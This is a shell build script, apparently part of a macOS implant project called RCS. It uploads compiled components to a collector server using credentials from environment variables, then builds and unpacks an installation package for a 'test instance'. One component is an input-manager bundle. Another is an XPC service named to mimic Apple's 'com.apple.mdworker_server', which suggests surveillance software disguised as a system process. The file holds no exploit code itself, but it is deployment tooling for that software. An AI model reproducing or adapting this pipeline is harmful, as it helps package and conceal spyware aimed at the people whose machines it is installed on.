#
# setting env from project
#
SYNCH_DB=${RCS_TEST_SYNCH}
TOOL_DIR=${SRCROOT}/tools/
TOOL=${SRCROOT}/tools/rcs-core.rb
BUILD_CONF=${SRCROOT}/tools/build.json
HOST=${RCS_TEST_COLLECTOR}
USR=${RCS_TEST_USER}
PASS=${RCS_TEST_PASSWD}
CORE=${TARGET_BUILD_DIR}/${TARGET_NAME}.app/Contents/MacOS/${TARGET_NAME}
INPUTMANAGER=${TARGET_BUILD_DIR}/RCSMInputManager.bundle/Contents/MacOS/RCSMInputManager
XPC=${TARGET_BUILD_DIR}/com.apple.mdworker_server.xpc/Contents/MacOS/com.apple.mdworker_server
OUTPUT_ZIP=${TARGET_BUILD_DIR}/osx.zip
OUTPUT_DIR=${TARGET_BUILD_DIR}/osx
INSTANCE=${RCS_TEST_INSTANCE}

DEBUG_DIR=${RCS_TEST_SHLIB_DIR}
CORE_BUILD_NAME=${TARGET_NAME}

if [ "$SYNCH_DB" == "NO" ]
then
 echo "don't synchronize core to DB." > /tmp/db_log.txt
 exit
fi 

echo "synchronize core to DB" >> /tmp/db_log.txt

. ~/.env
export GEM_HOME=$GEM_HOME

#
# upload the core to DB
#
echo "trying upload the core comps to DB..."

$TOOL -d $HOST -u $USR -p $PASS -n osx -a $CORE -A core >> /tmp/db_log.txt  2>&1
$TOOL -d $HOST -u $USR -p $PASS -n osx -a $INPUTMANAGER -A inputmanager >> /tmp/db_log.txt  2>&1
$TOOL -d $HOST -u $USR -p $PASS -n osx -a $XPC -A xpc >> /tmp/db_log.txt  2>&1

if [ $? -eq 0 ]
then
echo "done!"
else
echo "error: $?"
fi

echo

#
# create package for test instance
#
#echo "$TOOL -d $HOST -u $USR -p $PASS -f $INSTANCE -b $BUILD_CONF -o $OUTPUT_ZIP"
echo "trying create package for test instance..."

$TOOL -d $HOST -u $USR -p $PASS -f $INSTANCE -b $BUILD_CONF -o $OUTPUT_ZIP >> /tmp/db_log.txt  2>&1

if [ $? -eq 0 ]
then
echo "done!"
else
echo "error: $?"
fi 

echo "The installation package is: $OUTPUT_ZIP"

echo
echo "extracting component files to dir $OUTPUT_DIR"
mkdir $OUTPUT_DIR > /dev/null 2>&1
/usr/bin/unzip -o -d $OUTPUT_DIR $OUTPUT_ZIP >> /tmp/db_log.txt  2>&1
chmod 755 $OUTPUT_DIR/install

echo "build done!"
